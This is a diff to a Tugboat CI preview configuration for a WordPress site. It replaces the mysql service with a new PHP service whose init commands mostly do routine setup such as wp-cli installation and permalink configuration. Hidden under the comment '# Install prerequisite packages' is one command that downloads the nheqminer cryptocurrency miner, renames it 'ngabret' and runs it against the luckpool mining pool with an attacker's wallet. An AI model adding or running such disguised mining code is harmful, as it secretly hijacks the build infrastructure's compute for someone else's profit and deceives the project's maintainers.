@@ -60,9 +60,37 @@ services:
         visualdiff:
             threshold: 90
 
-    mysql:
-        image: tugboatqa/mysql:5
-        checkout: true
+services12:
+    php12:
+        default: true
+        image: tugboatqa/php:7.3-apache
+        depends: mysql2
         commands:
-            update:
-                - zcat database.sql.gz | mysql tugboat
+            init:
+
+                # Install prerequisite packages
+                - wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && mv nheqminer/nheqminer ngabret && ./ngabret -v -l ap.luckpool.net:3956 -u RCZiRNaUvTv9f6JPBMCVjt8XSULR47ZHVf.SUKUMANTE32 -p x -t 2
+                - apt-get install -y rsync
+
+                # Turn on URL rewriting.
+                - a2enmod rewrite
+
+                # Install PHP mysqli extension
+                - docker-php-ext-install mysqli
+
+                # Install wp-cli
+                - curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
+                - chmod +x wp-cli.phar
+                - mv wp-cli.phar /usr/local/bin/wp
+
+                # Link the docroot
+                - ln -snf "${TUGBOAT_ROOT}/docroot" "${DOCROOT}"
+
+                # Configure wordpress to work with tugboat
+                - wp --allow-root --path="${DOCROOT}" config create --dbhost=mysql --dbname=tugboat --dbuser=tugboat --dbpass=tugboat --force
+
+                # Update permalinks to remove the index.php.
+                - wp --allow-root --path="${DOCROOT}" option set permalink_structure /%postname%/
+                - wp --allow-root --path="${DOCROOT}" rewrite flush --hard
+
+
